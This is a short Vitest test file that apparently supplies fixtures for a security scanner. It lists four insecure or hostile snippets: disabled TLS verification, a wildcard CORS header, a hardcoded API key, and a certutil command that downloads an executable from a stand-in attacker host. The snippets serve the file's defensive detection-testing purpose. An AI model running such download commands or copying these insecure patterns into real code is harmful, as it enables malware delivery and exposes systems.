import { describe, expect, it } from 'vitest';

const suspiciousSnippets = [
    'requests.get(url, verify=False)',
    'res.setHeader("Access-Control-Allow-Origin", "*");',
    'certutil -urlcache -split -f http://evil.example/payload.exe',
    'api_key = "9fKq2zXv8Rt4Wm7nB3jLp6Yh1Gd5Sc0A"',
];

describe('scanner fixtures', () => {
    it('keeps one snippet per rule', () => {
        expect(suspiciousSnippets).toHaveLength(4);
    });
});
